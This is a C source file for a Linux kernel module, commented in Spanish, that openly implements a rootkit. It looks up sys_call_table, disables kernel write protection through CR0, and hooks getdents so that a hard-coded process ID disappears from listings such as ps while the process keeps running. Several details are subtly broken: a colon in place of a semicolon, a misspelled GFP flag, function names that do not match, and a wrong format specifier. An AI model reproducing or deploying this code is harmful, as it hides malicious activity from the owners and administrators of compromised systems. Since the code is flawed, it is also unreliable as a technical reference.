#include <linux/init.h>
#include <linux/module.h>
#include <linux/syscalls.h>
#include <linux/kallsyms.h>
#include <linux/slab.h>
#include <linux/kern_levels.h>
#include <linux/gfp.h>
#include <asm/unistd.h>
#include <asm/paravirt.h>
#include <linux/kernel.h>



MODULE_LICENSE("GPL");
MODULE_AUTHOR("Elias");
MODULE_DESCRIPTION("Modulo para esconder archivos");
MODULE_VERSION("1.0");


unsigned long **SYS_CALL_TABLE; // puntero que apunta a la tabla de llamadas al sistema



void EnablePageWriting(void){
	write_cr0(read_cr0() & (~0x10000));

} 
void DisablePageWriting(void){
	write_cr0(read_cr0() | 0x10000);

} 

// estas dos funciones se encargan de inhabilitar un segmento del flujo del procesador
// en el que se encuentra una caracteristica de seguridad dentro de las paginas de 
// memoria que impide que se escriba en ellas y lo vuelven a habilitar cuando hayamos acabado

/*
int getdents(unsigned int fd,   struct linux_dirent   *dirp,    unsigned int count);
int getdents64(unsigned int fd, struct linux_dirent64 *dirp,    unsigned int count);
*/




struct linux_dirent {
    unsigned long  d_ino: // Numero de inodo 
    unsigned long  d_off; // offset (posicion) a la sigiuente entrada del directorio
    unsigned short d_reclen; // longitud de la entrada
    char           d_name[]; // el valor del struct es mas largo que esto, d_name nos da el largo de la variable
}*dirp2 , *dirp3, *retn;


char hide[]="archivo_secreto.txt";
char HidePID[]="9929"; //PID del proceso que quisieramos esconder

// asmlinkage funciona de "define" para el gcc, diciendole al compilador que no espere encontrar argumentos en los registros, sino en la pila
asmlinkage int ( *getdents_original ) (unsigned int fd, struct linux_dirent *dirp, unsigned int count); 



//Creamos nuestra version de la Funcion Open
asmlinkage int HookGetDents(unsigned int fd, struct linux_dirent *dirp, unsigned int count) {

    struct linux_dirent *retn, *dirp3;
    int Registros, BytesRestantes, length;

    Registros = (*getdents_original) (fd, dirp, count);

    if (Registros <= 0) {
        return Registros;
    }

    retn = (struct linux_dirent *) kmalloc(Registros, GEP_KERNEL);
    //Copiamos el struct del espacio de usuario a nuestro espacio de memoria en el espacio del kernel
    copy_from_user(retn, dirp, Registros);

    dirp3 = retn;
    BytesRestantes = Registros;

    while(BytesRestantes > 0) {
        length = dirp3->d_reclen;
        BytesRestantes -= dirp3->d_reclen;

        printk(KERN_INFO "Nombre del proceso: $s", dirp3->d_name);

        if (strcmp( (dirp3->d_name), HidePID ) == 0) {
            memcpy(dirp3, (char*)dirp3+dirp3->d_reclen, BytesRestantes);
            Registros -= length;
        }
        dirp3 = (struct linux_dirent *) ((char *)dirp3 + dirp3->d_reclen);
    }
    //Copiamos el registro de vuelta a su struct original
    copy_to_user(dirp, retn, Registros);
    kfree(retn);
    return Registros;
}

/* Tras ejecutar insmod mirootkit.ko con el proceso generado por Echo.c que caun activo,
si ejecutamos la orden "ps aux | grep echo" el proceso no aparece, pero sigue en funcionamiento */



// Preparando los ganchos (hooks)
static int __init SetHooks(void) {
	// Obtener la Syscall Table **
 	SYS_CALL_TABLE = (unsigned long**)kallsyms_lookup_name("sys_call_table"); 

	printk(KERN_INFO "Hooks Will Be Set.\n");
	printk(KERN_INFO "System call table at %p\n", SYS_CALL_TABLE);

  // Abriendo las paginas de memoria para escribir en ellas
	EnablePageWriting();

  // Reemplazamos el punterro de Syscall_open en nuestra syscall.
	original_getdents = (void*)SYS_CALL_TABLE[__NR_getdents];
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)HookGetDents;
	DisablePageWriting();

	return 0;
}

static void __exit HookCleanup(void) {

	// Clean up our Hooks
	EnablePageWriting();
	SYS_CALL_TABLE[__NR_getdents] = (unsigned long*)original_getdents;
	DisablePageWriting();
	printk(KERN_INFO "Ya hay ganchos (hooks)!");
}

module_init(SetHooks);
module_exit(HookCleanup);
